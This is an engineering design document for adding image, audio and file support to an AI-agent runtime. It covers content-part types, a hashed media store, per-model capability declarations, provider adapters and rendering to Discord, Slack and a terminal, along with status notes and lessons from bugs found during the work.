# Media: design

How images (and audio, video, PDFs, arbitrary files) get into a prompt, out of a
tool, through the loop, and onto a screen — without breaking the text-only
assumptions the runtime is built on today.

Status: **P1-P5 shipped** — content parts, the media store, tools returning
media, providers inlining it, per-model capabilities enforced before the
request, inbound attachments, the UI rendering and composing media behind a
sanitizer and a CSP, and media travelling back out to Discord, Slack and the
terminal. What remains is the optional P6 extras and one known gap — see
*What is left*.

## Where this stands

Written for whoever picks this up next, including a later version of the person
who wrote it. The per-phase detail is under **Phases**; this is the short
version plus the things that are expensive to rediscover.

**Branch:** `worktree-media-support-plan` — seven feature commits, one per
phase, plus the docs. Nothing merged to `main` yet.

### Shipped

| Phase | What works now |
|---|---|
| P1 | `ContentPart` / `MediaRef` / `MessageContent` / `ToolOutput`; `messageText` + `toolOutputText` as the one text projection; `MediaStore` seam + registry + disk store; magic-byte type resolution; the `media` table and its retention sweep; `Message.content` and `ToolResult.output` widened |
| P2a | MCP image/audio blocks decode into the store instead of flattening to `[image content …]`; `screenshot()` returns real bytes; `capToolResultOutput` caps text and never media |
| P2b | `hydrateMedia` resolves refs to bytes once per request; Anthropic emits `image`/`document` **inside `tool_result`**; Bedrock emits Converse `image` blocks; `toOpenAIMessages` emits `image_url` parts on user/assistant turns, which is where the `follow-up` relay lands (added 2026-08-21 — see *The half of that workaround that shipped without the other half*) |
| P3 | `ModelCapabilities` with object leaves and tri-state `"unknown"`; `AIProvider.capabilities(model)`; `ModelEntry.capabilities`; the pre-flight in `chatWithFallback`; `supportsTools` made live |
| P4 | `InboundMessage`; Discord `attachments[]`; Slack `files[]` **and its file-only-message bug fixed**; `POST /api/media`, `GET /api/media/:id`, `mediaIds` on `/api/chat`; **the store finally constructed and wired into the runtime** |
| P5a | One sanitizing `renderMarkdown`; a server CSP; media rendered in user, assistant and tool-result bubbles; composer picker / paste / drop |
| P5b | `SurfaceCapabilities` (required) on `Channel` **and** `OutboundNotifier`; one shared `renderForSurface` ladder; Discord `files:`, Slack `files.uploadV2`, the CLI's placeholder + `file://`; `collectTurnMedia` as the producer |

New modules worth knowing about: `core/src/content/{types,codec}.ts`,
`core/src/media/{interface,disk,registry,queries,sniff,hydrate,turn}.ts`,
`core/src/providers/capabilities.ts`,
`core/src/channels/{capabilities,render}.ts`,
`ui/src/lib/{content,markdown}.ts`,
`ui/src/components/{MediaAttachments,Composer}.tsx`,
`cli/src/media-render.ts`.

### What is left

**P6 — optional, and genuinely optional.** Listed under *Phases*; nothing in
P1-P5 is waiting on any of it.

**Also open**, from earlier phases: the SSE `tool_result` event still truncates
to 1000 chars at two sites (`packages/server/src/index.ts:1178` and `:2447`) and
carries text only, and `onToolResult` still hands subscribers the text
projection.

This is less of a gap after P5b than it looked. Every surface now gets media the
same way — by reading the record, not the stream — so the streamed projection is
a *preview*, and the thing it previews is fetched separately. Worth fixing if a
surface ever needs media before the turn finishes; not worth fixing to make the
current surfaces work, because they already do.

### Things that cost time to learn

- **Verify the store is actually reached.** P1-P3 built the entire feature and
  nothing constructed a `MediaStore`; it worked only in tests. That is the
  `supportsTools` failure mode and it nearly shipped twice inside one
  workstream. `media-runtime-wiring.test.ts` exists solely to assert the wiring.
- **The compiler will not find the template sites.** `${msg.content}` on an
  object is legal TypeScript and renders `[object Object]`. Sweep by grep, not
  by build; P1 claimed to have done it and had missed `compact.ts`'s transcript
  builder, which feeds a summarizer prompt.
- **A worktree needs its native sqlite binding.** `pnpm install --ignore-scripts`
  leaves `better-sqlite3` unbuilt and the core suite reports ~1,588 phantom
  failures that look catastrophic and are not. Copy `build/` from the main
  checkout's `node_modules/.pnpm/better-sqlite3@*/…` rather than debugging it.
- **Rebuild core before typechecking dependents.** `packages/server` and the
  provider plugins compile against core's `dist`, so a new core export is
  invisible until `pnpm --filter @tailored-ai/core build` runs.
- **Sanitizing URLs by scheme hits every attribute.** Blocking remote images
  through `ALLOWED_URI_REGEXP` also strips `href` from every external link. Use
  a hook that can see the tag.
- **Find the interface production actually calls before widening one.** A grep
  for `.send(` found that nothing in production holds a `Channel`; the full
  story is under *Capabilities*.
- **A capability the caller can't honour is worse than no capability.** Declaring
  `attachments: true` with no media store configured made images vanish. See
  *The capability has to be true at the moment of use*.
- **The sweep for silent coercion is not just `${...}`.** `.join()` does it too,
  and that is how the stall detector spent five phases comparing every
  media-carrying tool result as `[object Object]` — so two different screenshots
  read as no progress and the turn was cut short. Grep for `.join(`, `String(`
  and raw `SELECT content FROM messages` as well; three more sites turned up
  that way.

### Verify

```bash
pnpm run build && pnpm run typecheck && pnpm run test
pnpm run guard:local-refs && pnpm run guard:pre-v1
npx biome check packages/    # repo-wide; a file subset misattributes blame
```

Green as of P5b: core 3,274 · cli 224 · evals 510 · server 132 ·
trusted-actions 101 (+2 skipped) · provider-openai 83 · deploy-aws 61 ·
provider-anthropic 52 · provider-bedrock 41 · provider-deepseek 21 · ui 19 ·
channel-slack 17 · provider-openrouter 15 · google-tools 13 ·
browser-mediator 13. Both guards pass and `biome check packages/` reports zero
errors.

## Why now

**All four holes below are now closed** — see *Phases*. The section is kept in
its original tense because it is the case for doing the work, and a case for
work reads badly rewritten as a report of it. Its line numbers point at the tree
as it was before P1 and no longer resolve; that is what makes them evidence
rather than directions.

Three places already have media in hand and throw it away, each with a comment
admitting it:

- **`packages/core/src/mcp/client.ts`** — `renderContent()` flattens an MCP
  tool result's `image` and `audio` blocks to the string
  `[image content (image/png)]`. The doc comment says why: *"the loop's tool
  results are text-only today."* Every MCP server that returns a screenshot,
  chart, or scanned page is already talking to us in a language we refuse to
  hear.
- **`packages/browser-mediator/src/mediator.ts`** — `screenshotMeta()` takes
  a real screenshot and returns `Captured ${buf.length} bytes. Mediator-owned;
  caller gets metadata only.` The bytes are discarded inside the function. A
  vision-capable browser agent is not merely unimplemented; it is
  unrepresentable.
- **`docs/context-assembly-design.md`**, under *Still open* — *"`Message.content`
  is `string | null`; a string-rendering assembler in core forecloses
  multimodal."*

Inbound is the same story from the other side. Discord messages carry
`attachments[]` and Slack events carry `files[]`; neither is read. A Slack
message that is *only* an image is not even delivered — the Slack channel guards
on `!message.text` and drops the event before the agent exists.

So this is not a feature that would be nice to have. It is a hole that four
subsystems are already falling into, quietly, in production.

## Goals

1. A user can attach media to a prompt, from any surface that can carry it.
2. A tool can return media, or text, or structured data, or text *and* media.
3. Every render surface shows media as well as it can, and degrades honestly
   when it can't.
4. A model declares what modalities it accepts, and the runtime respects that
   instead of discovering it via a 400.
5. Adding a new modality later does not require editing a union in core.

## Non-goals

- **Generating** images. Nothing here makes an agent produce a picture; it makes
  an agent able to *see* one and *pass one along*. Output modalities are
  declared (goal 4) so the seam exists, but no image-generation provider ships
  with this.
- Editing, resizing, transcoding, or thumbnailing. No `sharp`, no native deps.
  A resize step can be added later behind the store seam if a provider's size
  cap demands it.
- A media library UI. Media is attached to conversations, not browsable as a
  collection.
- Streaming media (live audio in, video out). The content model would extend to
  it; the transport would not, and pretending otherwise would shape the types
  badly.

## What other systems do

Surveyed because the wheel is round already.

Checked against primary sources: Anthropic's `tool_result` block types, the
Responses-vs-Chat-Completions split, vLLM's refusal of media on a `tool`
message, the Vercel AI SDK's part and tool-output shapes, OpenRouter's modality
fields, and Gemini's inline-size cap. MCP's block set is corroborated in-tree —
`mcp/client.ts` already switches on exactly `text` / `resource` /
`resource_link` / `image` / `audio`.

Exact field *spellings* below are still worth re-reading against the vendor's
docs before writing an adapter; several of these APIs renamed things during
2025–26, and this table is here for the shape of the answer, not to be
copy-pasted into a request builder.

### Content is an array of positional blocks — everywhere

| System | Shape |
|---|---|
| Anthropic Messages | `content: string \| ContentBlock[]`, blocks `text` / `image` / `document` / `tool_use` / `tool_result`; sources are a discriminated union `base64` / `url` / `file` (Files API `file_id`) |
| OpenAI Responses | `content: []` with `input_text` / `input_image` / `input_file`; image by `file_id`, URL, or data URI |
| OpenAI Chat Completions | `content: []` with `text` / `image_url` (data URI allowed) |
| Google Gemini | `parts: []`, each part either inline base64 bytes or a Files API URI, both carrying a mime type. Inline is capped by a **20 MB total request size**; the Files API is the documented path for anything larger or reused |
| Vercel AI SDK (v7, `LanguageModelV4`) | parts discriminated on `type`: `{type:'text', text}` and `{type:'file', mediaType, data}` — **one file part carrying a media type, no separate image part**. `UIMessage` (persisted) carries media as a **URL string**; `ModelMessage` (per-call) carries a tagged `FileData` union |
| MCP | `CallToolResult.content: (TextContent \| ImageContent \| AudioContent \| ResourceLink \| EmbeddedResource)[]` |

Two things are unanimous and worth stating as constraints rather than
preferences:

**Position carries meaning.** "This image, then this question about it" is
encoded by block order. Any design that loses ordering loses the ability to ask
about two images distinctly.

**Every one of them separates the reference from the bytes.** Anthropic's
`file_id`, Gemini's Files API URI, OpenAI's `file_id`, and MCP's `resource_link`
all exist so a large payload is *named* in the conversation and fetched
elsewhere. Gemini puts a number on why: inline bytes are capped by a 20 MB total
request size, and the Files API is the documented escape. Nobody's durable
conversation record is made of base64 — which is the same conclusion
`capToolOutput` reaches from the other direction, since it head/tail-slices its
input and would cut a base64 string into garbage.

### On `<image:abc>` placeholders

The question in the brief — *"maybe it's just a reference like `<image:abc>` and
then you have `{ abc: [bytes] }` attached"* — describes a real thing, but not at
the layer it first appears to.

No production model API takes an in-text placeholder. Not one of the six above.
Ordering is positional, and a placeholder inside a text block is just characters
to a tokenizer; the model gets no image from it. Prompt-templating libraries
that offer placeholder syntax resolve them into positional blocks before the
request goes out.

But the *detached-bytes* half of the intuition is exactly right, and this design
uses it twice (note this is a different idea from the rejected sidecar *field*
under **Content is one field, widened** — here the bytes sit outside the
conversation, which is the good version):

- **As storage.** `{ abc: [bytes] }` is a content-addressed store; `abc` is a
  hash. That is precisely the `file_id`/`fileUri` pattern, and it is what keeps
  base64 out of SQLite.
- **As a text projection.** When a surface genuinely cannot show an image — a
  text-only model, a plain terminal, a log line — something has to stand in for
  it, and `[image: chart.png 1024×768 image/png #a1b2c3d4]` is that something.

The rule that falls out: **a placeholder is a rendering, never a transport.** It
is what a part looks like when flattened for a surface that can't do better, and
it is never parsed back out of text to reconstruct meaning. Reconstruction by
regex over model-authored text is how the room envelope already works
(`rooms/envelope.ts`), and it is not a mistake worth repeating on binary data.

### Tool results carrying media

The crunchy part, and the place providers actually disagree.

**Anthropic accepts it inline.** `tool_result.content` takes `text`, `image`,
`document`, and `search_result` blocks
([docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/handle-tool-calls)):

```json
{"type": "tool_result", "tool_use_id": "toolu_…",
 "content": [{"type": "text", "text": "15 degrees"},
             {"type": "image", "source": {"type": "base64",
                                          "media_type": "image/jpeg",
                                          "data": "/9j/4AAQ…"}}]}
```

**Bedrock Converse accepts it inline.** `toolResult.content` takes
`text` / `image` / `document` / `json` blocks. Our `provider-bedrock` already
imports the SDK's `ContentBlock` union — it simply never constructs the image
variant (`provider.ts:84`).

**OpenAI Responses accepts it.** Function-call output may be an array of image
or file objects rather than a string.

**OpenAI Chat Completions does not.** A `tool` message's `content` is a string.
This is the one that matters most for us: the built-in `openai_compatible`
provider speaks Chat Completions, and so do vLLM, llama-swap, OpenRouter, and
DeepSeek — the entire local and budget path. vLLM is explicit about it, and
rejects an `image_url` part on a `role: "tool"` message with *"tool message
content only supports text content"*
([vllm-project/vllm#43203](https://github.com/vllm-project/vllm/issues/43203)),
even for a vision model that accepts the identical part on a `user` message.
The documented workaround is to return a short text result and send the image in
a **subsequent user message**.

So the split is not cloud-versus-local or old-versus-new. It runs *through* a
single provider package: `provider-openai` ships a Responses adapter that can
inline and a Chat Completions adapter that cannot. Capability therefore has to
resolve per model and per rung, never per provider class.

That workaround has a cost that the Anthropic docs name explicitly on the same
page as the shape above:

> Tool results often carry content from sources outside your control: web pages,
> inbound email, user uploads, third-party APIs. Treat that content as
> untrusted... Keep untrusted content inside `tool_result` blocks rather than
> `system` prompts or plain user `text` blocks.

Promoting a tool-returned image into a user turn moves attacker-influenceable
content from the quarantined position into the trusted one. So the fallback is
not free, and it is not automatic: it is a declared, per-model behaviour with a
label attached (see *Degradation*).

#### The half of that workaround that shipped without the other half

Fixed 2026-08-21, and worth writing down because of *how it hid*. The ladder
above was built end to end except for its last rung: `adaptForCapabilities`
synthesized the following user turn correctly, and `toOpenAIMessages` then
flattened that turn to a text placeholder along with every other message, since
it had no access to bytes and took none. The provider meanwhile *declared*
`toolResultMedia: { supported: true, mode: "follow-up" }`.

Every layer was individually honest. The capability said the relay was
supported — and the relay was, it just ended in a converter that dropped the
payload. `notes` recorded "media moved out of the tool result into a following
user turn". Nothing errored, nothing warned, and the model received a
well-formed placeholder of the kind this design specifies for the cases where an
image legitimately cannot be sent. The result was that **no image ever reached a
model on `openai_compatible`** — the default provider, and the one the entire
local path speaks — while every observable said it had.

Two things eventually gave it away, neither of them a log line:

- **The token count.** A request carrying a 960×720 screenshot billed 244 prompt
  tokens. With the image it bills 867.
- **The model's own reasoning trace**, which read the placeholder and asked
  whether it could see the image at all.

The lesson for the next modality: a declared capability is a claim about the
whole path, and the only proof it holds is a round-trip where the model
describes something that is only knowable from the bytes. Both of the checks
above are properties of the *request*, not of the code — which is why unit
tests on either end of this passed throughout.

**How MCP clients handle the same split:** they hold the typed blocks and adapt
per provider — inline where the API allows it, a follow-up turn or a text
placeholder where it doesn't. That is the design being adopted here, because it
is the only one that survives a fallback chain whose rungs disagree.

### Capability declaration

- **OpenRouter** publishes `input_modalities` and `output_modalities` per model
  as string arrays (`"text"`, `"image"`, `"file"`, …), and lets you *filter the
  model list* by output modality.
- **LiteLLM** ships a static `model_cost` map with `supports_vision`.
- **Anthropic** exposes a `capabilities` field on the Models API
  (`GET /v1/models/{id}`).
- **Vercel AI SDK** carries per-model flags and downgrades URLs to bytes when a
  provider can't fetch them itself.

The pattern is uniform: a declaration, overridable, consulted *before* the
request. Nobody relies on the 400.

OpenRouter's filter is worth stealing later. `AIProvider.listModels()` returns
bare ids today (`providers/interface.ts:168`), which is why the setup wizard offers
free-text entry and no capability hint. A provider that can report modalities
alongside ids would let the wizard stop offering a text-only model to an agent
whose tools return screenshots. Out of scope here; noted so the `listModels`
signature is widened once rather than twice.

## The design

### One part type, not four

```ts
export type ContentPart =
  | { type: "text"; text: string }
  | { type: "media"; media: MediaRef; alt?: string };

export interface MediaRef {
  /** sha256 of the bytes, hex. The id IS the content. */
  id: string;
  mimeType: string;
  bytes: number;
  name?: string;
  width?: number;
  height?: number;
  /**
   * Where the bytes live when they are NOT in the store — an https URL the
   * provider may fetch itself. Unset means "ask the MediaStore".
   */
  url?: string;
}

export type MediaKind = "image" | "audio" | "video" | "document" | "other";
export function mediaKind(mimeType: string): MediaKind;
```

A single `media` variant rather than separate `image` / `audio` / `video` /
`document` variants, because goal 5 says a new modality must not require editing
a union in core. The mime type already carries the kind; every consumer that
cares — provider adapters, render surfaces — has to switch on mime anyway.
`mediaKind()` gives the ergonomics back without the coupling.

The closest framework-layer analogue reached the same conclusion independently:
the Vercel AI SDK has no image part. It has `{type:'file', mediaType, data}`,
and an image is a file whose `mediaType` starts with `image/`. That is this
design's `media` part with different spelling, arrived at by a project that
started with a separate image part and collapsed it.

Tradeoff, stated honestly: this is less idiomatic TypeScript than a wide
discriminated union, and it moves an exhaustiveness check from the compiler to a
function. That is the price of not having core know the list of modalities. MCP
made the opposite choice and has been adding block types ever since.

### Content is one field, widened

`Message.content` carries the parts. There is no second field.

```ts
/** The non-string arm is an OBJECT, not a bare array. See below — this is load-bearing. */
export interface MessageContent {
  parts: ContentPart[];
}

export interface Message {
  role: "system" | "user" | "assistant" | "tool";
  content: string | MessageContent | null;
  toolCalls?: ToolCall[];
  toolCallId?: string;
  reasoning?: string;
}

/** The text projection, as a function. Not a stored field — nothing to drift. */
export function messageText(content: string | MessageContent | null): string;
```

A string still means what it always meant, so the ~95% text-only path is
unchanged at every construction site, exactly as the vendor APIs allow
(`content: string | ContentBlock[]`). Only *reads* change.

An earlier draft of this document proposed a sidecar — `content` kept as a
`string` projection with a parallel `parts?: ContentPart[]`. That is rejected,
and TAI having no external users is what makes rejecting it affordable: a
one-time loud break is cheaper than a permanently duplicated field. The deeper
reason is the failure mode. A sidecar fails *silently* — a consumer keeps
reading `content`, renders the projection, and the image is invisible forever,
with no error and no failing test. A break you must fix beats a bug you never
see.

**But a naive `string | ContentPart[]` does not give you that loud break, and
the compiler proves it.** Widening `Message.content` to that union and running
`tsc` over `packages/core` produces exactly **one** error. That is not good
news. `string` and `Array` share `.length`, `.slice`, `.indexOf`, `.includes`
and `.at`, so the read sites silently accept an array:

| Real call site (line numbers pre-P1) | `string \| ContentPart[]` | `string \| MessageContent` |
|---|---|---|
| `(msg.content ?? "").length` — `estimateTokens`, `loop.ts:564` | **compiles** ⚠️ | errors ✓ |
| `msg.content.slice(0, 300)` — trim log, `loop.ts:784` | **compiles** ⚠️ | errors ✓ |
| `` `[${msg.role}]: ${msg.content}` `` — `compact.ts:177` | **compiles** ⚠️ | **compiles** ⚠️ |
| assign to `string \| null` — `saveMessage`, `queries.ts:69` | errors ✓ | errors ✓ |

Line numbers in that table and in the paragraph below are **as of the pre-P1
tree**, since that is the tree the experiment ran against. They have since moved
and are left as they were: renumbering them would quietly turn a record of a
measurement into a claim about current code.

Under the array union, `estimateTokens` would return *the number of parts*
instead of a character count, and the compaction transcript would hand
`[object Object]` to the summarizer. Both silently, in the hot path.

Wrapping the arm in an object fixes it, because `{ parts }` has no `.length` and
no `.slice`. Of 47 `Message.content` read sites repo-wide, roughly 40 already
break loudly under either union (`.replace`, `.trim`, assignment to `string`);
the object wrapper converts most of the remaining silent ones. **Only bare
template interpolation stays silent under both** — a finite, greppable set
(`compact.ts:177`, `loop.ts:1673`, and two joins in `evals/`), swept once by
hand in P1 rather than trusted to the compiler.

This is a TypeScript-specific tax. Anthropic and OpenAI can use a bare
`string | Block[]` because JSON has no structural typing to fool. We cannot.

Precedent for the *helper*, not for a second field: `messageText()` is a
function over one source of truth, so unlike a stored projection it cannot go
stale. Every site that legitimately only wants text — logging, excerpts, the
compaction transcript, FTS — calls it and says so at the call site.

The Vercel AI SDK reaches a related conclusion from the persistence side.
`UIMessage` is the stored, transport-facing record and carries media as a
**URL string**; `ModelMessage` is the per-call projection carrying a tagged data
union. The split exists because a `Uint8Array` in the persisted type would not
survive JSON serialization — the stored layer never holds bytes. `MediaRef` is
that same choice: an id and a mime type stored, bytes resolved at the edge.

**Storage consequence.** `messages.content` is a single `TEXT` column and stays
one column — the objection to a duplicated field applies to the API, and
denormalizing storage to dodge an API problem would be the same mistake wearing
a hat. Writes JSON-encode the object arm and store the string arm verbatim;
reads try `JSON.parse` and accept the result only if it strictly matches
`{ parts: [...] }` with a known `type` on every element, falling back to "this
is a plain string". Existing rows therefore need **no rewrite** — which matters,
because the live deployment's `agent.db` holds 2000+ sessions and a bulk
`UPDATE` over its `messages` table is a risk this design does not need to take.
The one ambiguity is a legacy message whose literal text is a valid parts array;
strict shape validation makes that vanishingly unlikely, and it is recorded here
rather than hidden.

### `ToolResult.output` is widened the same way

```ts
export interface ToolOutput {
  parts: ContentPart[];
  /** Machine-readable result, when the tool has one. Mirrors MCP structuredContent. */
  structured?: unknown;
}

export interface ToolResult {
  success: boolean;
  output: string | ToolOutput;
  error?: string;
  endsTurn?: boolean;
  endsTurnReason?: string;
}
```

Same shape, same reasoning, same object wrapper. A plain string still means
what it always meant, so **none of the 398 `success: true|false` literals across
42 files changes** — construction is untouched, because `string` remains a
member of the union. What changes is the far smaller set of *read* sites:
`capToolOutput`, the repeat detector's `results.map(r => r.output).join("|")`,
`executeToolCall`, and the seven `onToolResult` sinks. Those are the places that
must decide what a tool's media means, which is exactly where the decision
belongs.

`structured` answers the "JSON" half of the brief and lives inside `ToolOutput`
rather than beside it — a tool returning structured data is returning a
structured output, not a string with an attachment. It is not sent to the model
as a separate channel (models take text and media); it is what event
subscribers, the UI, and workflow steps read instead of re-parsing prose.

The Vercel AI SDK goes one step further, making the whole thing a tagged union
— `output: {type:'json', value}` / `{type:'content', value:[...]}`. That is
arguably cleaner still, and it was considered. It is not taken because the tag
buys nothing here that the `string | ToolOutput` union does not already give,
while costing all 398 construction sites. This is the one place the "no external
users, so break it" licence is deliberately *not* spent: the churn is large, the
benefit is aesthetic, and `endsTurn` would have to move too.

`onToolResult` was **planned to widen and deliberately did not.** The intent was
`(name: string, result: string | ToolOutput)`, breaking its seven consumers —
server SSE, CLI, task-watcher, cron, rooms watcher, autopilot, exploratory — so
each would have to decide what it does about rendering.

P5b removed the reason. Every surface now gets media by reading the message
record, which is where the media already is, so widening the observer would have
handed seven consumers a second way to learn the same fact — and a second way to
get it wrong. The signature stays `(name, result: string)` and the callback
passes `toolOutputText(...)`, which is honest: the observer is a *notification*
that a tool ran, and its payload is a projection by design rather than by
oversight.

Recorded here because "we planned to break this and then didn't" is the kind of
thing that otherwise reads as an oversight to the next person who greps for it.

### The media store

A seam, with a default implementation, registered like every other backend:

```ts
export interface MediaStore {
  id: string;
  /** `mimeType` is optional — magic bytes decide when the caller cannot. */
  put(bytes: Buffer, opts?: PutMediaOptions): Promise<MediaRef>;
  get(id: string): Promise<{ ref: MediaRef; bytes: Buffer } | undefined>;
  stat(id: string): Promise<MediaRef | undefined>;
  delete(id: string): Promise<boolean>;
  /** For surfaces that hand out URLs rather than bytes. */
  urlFor?(id: string): string | undefined;
  /**
   * A path on this machine, for surfaces that can open one — the CLI's
   * `file://` rung. Optional because an S3-backed store genuinely has none,
   * and a fabricated path would be worse than nothing.
   */
  localPathFor?(ref: MediaRef): string | undefined;
}
```

Default: bytes at `<TAI_HOME>/media/<ab>/<sha256>`, metadata in a `media` table.
This copies `documents` (metadata row in SQLite, bytes on disk) and generalizes
`tool-output.ts`'s `persistFullOutput`, which already hashes tool output with
sha256 and writes it under a content-addressed name. That function's doc comment
argues the case better than a new one could:

> Named by hash rather than timestamp on purpose. The loop's stuck-model
> detector compares consecutive tool results verbatim, so a marker carrying a
> unique path would make two identical results compare unequal and quietly
> disable that guard... Hashing also dedupes: the same payload written twice is
> one file.

Both properties are load-bearing here too. An agent that screenshots the same
unchanged screen three times produces one blob and three identical projections,
so `loop.ts:1916`'s repeat detector still fires. A UUID per capture would break
it silently, exactly as the comment warns `exec` already does.

Registered through `Registry<MediaStoreFactory>` so a deployment can swap in S3
or a CDN without core knowing the name of either.

**Retention is part of the feature, not a follow-up.** Screenshots accumulate
fast. `media.retentionDays` (default 30) plus a sweep that deletes blobs no live
session references, following the memory sweep's shape.

### Capabilities

Two independent axes. Both modelled on `RoomCapabilities`
(`rooms/types.ts:153`), which already establishes the house pattern and states
the intent: *"Callers feature-detect through this rather than duck-typing
methods, so an unsupported action fails with a clear message instead of a
TypeError."*

**What a model accepts:**

```ts
/**
 * A leaf is an object, never a bare boolean, so it can grow limits later
 * without a breaking change. `"unknown"` is distinct from `false`.
 *
 * Shipped as one interface with a tri-state `supported` rather than the
 * three-arm union first drafted here. Same three states, far less ceremony at
 * the ~40 construction sites, and the fields a `false` leaf does not use are
 * simply absent rather than made unrepresentable — which turned out not to be
 * worth a discriminated union nobody was narrowing on anyway.
 */
export type SupportState = true | false | "unknown";

export interface Support {
  supported: SupportState;
  maxBytes?: number;
  maxItems?: number;
  formats?: string[];
}

export interface ToolResultMediaSupport extends Support {
  mode?: "inline" | "follow-up";
}

export interface ModelCapabilities {
  /** Mime types or globs accepted as input: ["text/*", "image/*"]. */
  input: string[];
  output: string[];
  /** Inline bytes and a fetchable URL are different capabilities. */
  inputBytes: Support;
  inputUrl: Support;
  /** Media inside a tool result is its own capability, not implied by input. */
  toolResultMedia: ToolResultMediaSupport;
  /** What `supportsTools` should always have been. */
  tools: Support;
}
```

Three shapes borrowed rather than invented, each from something that got it
wrong first:

**A leaf is an object.** Anthropic's Models API returns
`capabilities.image_input: { supported: true }` — never a bare boolean — so a
leaf can later grow `max_size` or `formats` without breaking a reader. It also
makes the whole `capabilities` object nullable, meaning *absent ≠ unsupported*.

**`"unknown"` is not `false`.** LiteLLM's `supports_vision(model)` and its
sixteen siblings all swallow exceptions and return `False` for a model they have
never heard of, so "this model has no eyes" and "I have no idea what this model
is" are the same value. That is precisely wrong for us: a local gateway serves
whatever was last loaded under a name core cannot introspect, so *unknown is the
common case*, and treating it as `false` would refuse images to a vision model
purely for lacking a config line. Unknown is a third state, and policy decides
what to do with it.

**Bytes, URL, and tool-result media are three capabilities, not one.**
LangChain's `ModelProfile` splits `image_inputs` / `image_url_inputs` and
separately carries `image_tool_message` / `pdf_tool_message` — media in a tool
result is tracked apart from media in a user turn, which is the same distinction
this design arrived at from the vLLM failure. Independent arrival is worth more
than either observation alone.

And one shape deliberately *not* borrowed: LiteLLM's flat namespace of 34
`supports_*` booleans has visibly drifted — `supports_vision` set on 1007
entries, `supports_image_input` on 6, `supports_multimodal` on 6, all nominally
about the same thing. Modalities stay in the `input`/`output` arrays; only
genuinely distinct mechanisms get their own leaf.

Declared on the provider as **a function of the model id, not a constant**:

```ts
export interface AIProvider {
  // …
  /** What this provider accepts for a given model. Omit to mean text-only. */
  capabilities?(model: string): ModelCapabilities;
}
```

A static field would be unable to describe the provider we already ship.
`provider-openai` registers a single provider id whose `OpenAIRouterProvider`
dispatches **per call, against `params.model`**, to a Responses adapter
(`inline`) or a Chat Completions adapter (`follow-up`). Its doc comment
(`router.ts:1`) makes the general argument better than this one does:

> which endpoint a request needs is a property of the *model*, and the model is
> not fixed at build time: an agent can pin its own, a per-call override can name
> another, and a fallback chain rung can carry a third. Choosing from
> `defaultModel` when the provider is constructed would silently send an
> overridden model to the wrong endpoint.

Capability has exactly that shape. A constant would be a second `supportsTools`:
a declaration that cannot express what is true, and so gets ignored.

The Vercel AI SDK reached the same shape. Its `LanguageModelV4` interface has
four members, and one of them is `supportedUrls` — **required, not optional**,
and permitted to return a promise so a provider can fetch a live list. Its
Google provider builds the value inside the factory closure where `modelId` is
in scope, gating on the id itself:

```ts
supportsExternalFileUrls = (id) => /(^|\/)gemini-/.test(id) && !/(^|\/)gemini-2\.0/.test(id)
```

Two lessons taken: capability is **per model instance, not per provider class**,
and making it a required member is what stops it becoming decorative. Ours is
optional only because 6 provider packages would otherwise fail to compile on
upgrade; the three rules in *Not another dead flag*, below, are what substitute
for it.

Resolution order, most specific first: `ModelEntry.capabilities` in config →
`provider.capabilities(model)` → **`"unknown"`**. `ModelEntry` already has the
precedent for per-rung overrides in `maxContextTokens`, and config has to win
because a local gateway serves whatever model was last loaded under a name core
cannot introspect.

An earlier draft of this document ended that chain at "a conservative text-only
default", which is wrong and worth recording as wrong. Most models TAI talks to
will never have a capability line — auto-discovery is not available for the ones
that matter, since Bedrock's `inputModalities` enum is only
`TEXT | IMAGE | EMBEDDING` (a model taking PDFs and a model taking video both
just say `IMAGE`), and Gemini's Models API publishes **no** modality fields at
all. So "undeclared" is the normal state, not the exceptional one, and silently
resolving it to text-only would make the default behaviour "your vision model
cannot see" until someone writes config. `"unknown"` resolves under
`media.onUnknown` — `try` (send it; the provider's 400 is the answer, and the
quirks ladder in `providers/quirks.ts` already exists to memoize exactly that
kind of learned per-model fact) or `degrade`. `try` is the better default here
precisely because TAI already has machinery for learning a model's constraints
from its refusals.

**What a surface can show:**

```ts
export interface SurfaceCapabilities {
  inlineMedia: boolean;      // an HTML page, a Discord embed
  attachments: boolean;      // Discord files[], Slack files.uploadV2
  links: boolean;            // can render a fetchable URL
  maxMessageLength: number;
  maxBytes?: number;
  mimeTypes?: string[];
}
```

`Channel` had no capability struct; the closest thing was a hardcoded
`MAX_MESSAGE_LENGTH` copy-pasted into two `splitMessage` implementations
(2000 for Discord, 3000 for Slack) — one fact recorded twice with nothing
keeping the copies honest. A limit is a capability, so it moved in.

**Required, not optional**, and unlike `AIProvider.capabilities` this one could
afford to be: the surface count is small and all of it lives in this repo. That
is the `supportedUrls` lesson from two sections up, finally taken. A surface with
nothing to declare spreads `TEXT_ONLY_SURFACE` and is then *honestly described*
rather than merely undescribed, and the channel contract suite asserts the struct
is populated so a new transport cannot ship without one.

It goes on **`OutboundNotifier` as well as `Channel`**, which is the part worth
writing down. The two interfaces are structurally identical and every production
caller — cron, autopilot, task-watcher, the workflow executors, the agent
notifier — resolves through `OutboundNotifier`, not `Channel`. Widening only
`Channel` would have compiled cleanly, passed every test, and changed nothing
anywhere in production. That is the `supportsTools` disease in its quietest
form: not a flag nobody reads, but a flag on the object nobody holds.

### The capability has to be true at the moment of use

A surface that *can* attach files is not the same as a surface that *will*,
and conflating the two broke the central rule of this document inside the code
written to enforce it.

Discord and Slack both declare `attachments: true`, truthfully. But the bytes
come from the `MediaStore`, and a deployment that has not configured one has no
bytes to send. The ladder, told the surface could attach, routed the part to the
attachment rung and emitted no placeholder for it — and then the upload step
found no store and uploaded nothing. The image did not degrade. It disappeared,
which is the outcome the whole design exists to prevent.

The fix is a rule, not a patch: **resolve capabilities against the conditions of
this delivery, not the transport's datasheet.** Both channels now narrow their
own declaration before rendering:

```ts
const caps = store ? this.capabilities : { ...this.capabilities, attachments: false, inlineMedia: false };
```

This generalizes. The same shape covers a token without the `files:write` scope,
a guild that has revoked attachment permission, and a transport in a degraded
state. The declaration says what the surface can do; the value handed to the
renderer says what it can do *now*.

### Not another dead flag

`AIProvider.supportsTools` is declared on the interface, hard-set to `true` by
every provider, and **read by nothing that changes behaviour** — one evals
recorder and some contract assertions. It is a capability declaration that
declares into the void, and it is the exact failure mode this design is most at
risk of repeating.

It is also not a TAI-specific disease. LiteLLM ships a `supports_audio_output`
helper whose body reads the `supports_audio_input` key — 113 model entries set
`supports_audio_output`, and nothing correctly reads any of them. LangChain's
`ModelProfile` documents that *"model inputs can be gated based on supported
modalities"* and then enforces nothing, leaving the gating to the application.
